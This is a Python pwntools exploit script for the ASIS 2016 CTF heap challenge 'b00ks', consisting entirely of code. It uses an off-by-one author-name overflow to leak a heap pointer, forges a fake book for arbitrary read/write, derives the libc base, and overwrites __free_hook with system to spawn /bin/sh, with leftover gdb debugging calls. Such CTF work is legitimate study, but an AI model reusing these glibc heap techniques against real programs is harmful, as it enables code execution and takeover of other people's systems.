#Asis 2016 b00ks
from pwn import*
context(arch='amd64',os='linux')

p=process('./b00ks')
libc=ELF('libc.so.6')
p.recvuntil(b'Enter author name: ')


p.sendline(b'a'*0x20)

def create(name_size, book_name, desc_size, book_desc):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Enter book name size: ')
    p.sendline(str(name_size).encode())
    p.recvuntil(b'Enter book name (Max 32 chars): ')
    p.sendline(book_name)
    p.recvuntil(b'Enter book description size: ')
    p.sendline(str(desc_size).encode())
    p.recvuntil(b'Enter book description: ')
    p.sendline(book_desc)

def print1(index):
    p.recvuntil(b'> ')
    p.sendline(b'4')
    for i in range(index):
        p.recvuntil(b'ID: ')
        book_id=int(p.recvline().strip())
        p.recvuntil(b'Name: ')
        book_name=p.recvline().strip()
        p.recvuntil(b'Description: ')
        book_des=p.recvline().strip()
        p.recvuntil(b'Author: ')
        book_author=p.recvline().strip()
    return book_id,book_name,book_des,book_author

def edit(index,new_des):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'Enter the book id you want to edit: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Enter new book description: ')
    p.sendline(new_des)

def change(new_name):
    p.recvuntil(b'> ')
    p.sendline(b'5')
    p.recvuntil(b'Enter author name: ')
    p.sendline(new_name)

def delete(index):
    p.recv()
    p.sendline(b'2')
    p.recvuntil(b'Enter the book id you want to delete: ',)
    p.sendline(str(index).encode())

create(0x140,b'book1',0x140,b'first book')
create(0x21000,b'book2',0x21000,b'second book')
book_id,book_name,book_des,book_author=print1(1)
book1_addr=u64(book_author[0x20:0x26].ljust(8,b'\x00'))
print("book1_addr: "+hex(book1_addr))
book2_addr=book1_addr+0x30
print("book2_addr: "+hex(book2_addr))
book2_name=book2_addr+8
print("book2_name: "+hex(book2_name))
book2_des=book2_addr+16
payload=b'a'*0x90+p64(1)+p64(book2_name)+p64(book2_name)+p64(0xff)
edit(1,payload)
change(b'a'*0x20)
offset=0x5ca010

# book_id,book_name,book_des,book_author=print(1)
# name_addr=u64(book_name[-6:].ljust(8,b'\x00'))
p.recvuntil(b'> ')
p.sendline(b'4')
p.recvuntil(b'Name: ')
temp = p.recvuntil(b'\n')
name_addr = u64(temp[:-1].ljust(8, b'\x00'))
print("hex(name_addr): " + hex(name_addr))
libc_base=name_addr-offset
print("hex(libc_base): " + hex(libc_base))
system_addr=libc_base+libc.symbols['system']
binsh_addr=libc_base+next(libc.search(b'/bin/sh'))
free_hook = libc.symbols['__free_hook'] + libc_base
payload=p64(binsh_addr)+p64(free_hook)
print(b'-----------------')
print('binsh_addr: ' + hex(binsh_addr))
print('free_hook: ' + hex(free_hook))
print('system_addr: ' + hex(system_addr))
edit(1,payload)
payload=p64(system_addr)
edit(2,payload)
gdb.attach(p)
pause()
delete(2)

p.interactive()

# gdb.attach(p)
# pause()
# p.interactive()
